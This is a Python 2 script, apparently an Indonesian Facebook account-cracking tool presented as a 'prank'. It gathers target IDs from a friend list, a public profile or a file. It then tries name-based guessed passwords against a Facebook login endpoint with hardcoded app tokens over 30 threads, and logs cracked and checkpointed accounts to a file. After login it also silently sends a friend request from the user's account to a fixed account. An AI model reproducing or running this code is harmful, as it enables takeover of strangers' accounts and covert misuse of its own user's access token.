#!/usr/bin/python
# coding=utf-8
#jangan di recode ngentot
#recode jomblo seumur hidup
# (MR.K7C8NG) PEMBUAT
#SUBSCRIBE CHANNEL mrk7c8ng-ices
#FOLLOW INSTAGRAM @pranata_pasha

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser

#-Setting-#
########
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

#-Keluar-#
def keluar():
	print "\033[1;91m[!] Exit"
	os.sys.exit()
	
#-Warna-#
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
	
#-Animasi-#
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
		
##### LOGO #####
logo = """\033[1;96m█████████
\033[1;96m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[1;96m█\033[1;91m▼▼▼▼▼ \033[1;95m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ 
\033[1;96m█ \033[1;92m \033[1;95m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
\033[1;96m█\033[1;91m▲▲▲▲▲\033[1;95m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;96mGOLD-SETAN
\033[1;96m█████████      \033[1;92m«----------✧----------»
\033[1;96m ██ ██
\033[1;96m╔══════════════════════════════════════════════╗
\033[1;96m║\033[1;96m* \033[1;95mAuthor  \033[1;93m: \033[1;95mBrother•MR.K7C8NG \033[1;96m                ║
\033[1;96m║\033[1;96m* \033[1;96mGitHub  \033[1;93m: \033[1;96m\033[4mhttps://github.com/pashayogi\033[0m \033[1;96m     ║
\033[1;96m║\033[1;96m*\033[1;93mYOUTUBE  \033[1;93m: \033[1;91m\033mhttps://youtube.com/c/mrk7c8ng\033[0m \033[1;96m   ║
\033[1;96m║\033[1;97m*\033[1;97mINSTAGRAM\033[1;92m: \033[1;96m\033m@pranata_pasha\033[0m \033[1;96m                   ║
\033[1;96m╚══════════════════════════════════════════════╝"""

# titik #
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91m[●] \033[1;92mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idteman = []
idfromteman = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

##### LICENSE #####
#=================#
def lisensi():
	os.system('reset')
	masuk()

##### Pilih Login #####
def masuk():
	os.system('reset')
	print logo
	print "\033[1;91m║--\033[1;91m> \033[1;95m1.\033[1;96m Login"
	print "\033[1;92m║--\033[1;91m> \033[1;95m2.\033[1;96m Login using token"
	print "\033[1;93m║--\033[1;91m> \033[1;95m0.\033[1;96m Exit"
	print "\033[1;95m║"
	msuk = raw_input("\033[1;96m╚═\033[1;1mD \033[1;93m")
	if msuk =="":
		print"\033[1;91m[!] Wrong input"
		keluar()
	elif msuk =="1":
		login()
	elif msuk =="2":
		tokenz()
	elif msuk =="0":
		keluar()
	else:
		print"\033[1;91m[!] Wrong input"
		keluar()
		
##### LOGIN #####
#================#
def login():
	os.system('reset')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('reset')
		print logo
		print('\033[1;96m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
		pwd = getpass.getpass('\033[1;95m[+] \033[1;93mPassword \033[1;93m:\033[1;95m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;91m[!] No connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				zedd = open("login.txt", 'w')
				zedd.write(z['access_token'])
				zedd.close()
				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mIt seems that your account has a checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[!] \x1b[1;91mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;24m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
	print "\033[1;94m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
	print "\033[1;96m☩═════════════════════════════════════☩"
	print "\x1b[1;97[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m➜ Start PrAnK"
	print "\x1b[1;97m[\x1b[1;92m0\x1b[1;96m]\x1b[1;93m➜ Exit"
        print "\033[1;96m☩═════════════════════════════════════☩"
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m☩═════════════════════════════════════☩"
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m PrAnK From Friend List"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m PrAnK From Any Public ID"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File (target)"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
	print "\033[1;96m☩═════════════════════════════════════☩"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;96m[✺] \033[1;93mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mGetting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter Target link type👽(farilist.txt)\x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mTarget Not Found'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;96m[+] \033[1;91mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;96m[✺] \033[1;94mStarting \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;91m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
	print "\033[1;96m☩═════════════════════════════════════════☩"
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '1234'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
     
				print '\x1b[1;96m[\x1b[1;93mLogin\x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 + ' → ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
   
					print '\x1b[1;96m[\x1b[1;93mCheck\x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 + ' → ' + b['name']
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
       
						print '\x1b[1;96m[\x1b[1;93mLogin\x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 + ' → ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
        
							print '\x1b[1;96m[\x1b[1;93mCheck\x1b[1;12m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 + ' → ' + b['name']
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
        
								print '\x1b[1;96m[\x1b[1;93mLogin\x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 + ' → ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
        
									print '\x1b[1;96m[\x1b[1;93mCheck\x1b[1;12m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 + ' → ' + b['name']
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['last_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
       
										print '\x1b[1;96m[\x1b[1;93mLogin\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 + ' → ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
        
											print '\x1b[1;96m[\x1b[1;93mCheck\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 + ' → ' + b['name']
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
        print "\033[1;98m👻 ⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌ 👻"
	print '\033[1;93mProcess Has Been Completed'
	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
\033[1;96m❋❈╰┻✪✪╧─────────────────────────────────────➛➢
  
  
  \033[1;95mTHANK YOU FOR USING OUR TOOL
\033[1;95mCHECKPOINT ACCOUNT AFTER 3 DAYS
  \033[1;95m   😜 ThE AthLetix
\033[1;98m👻 ⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌ 👻   """
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	menu()

if __name__ == '__main__':
	login()
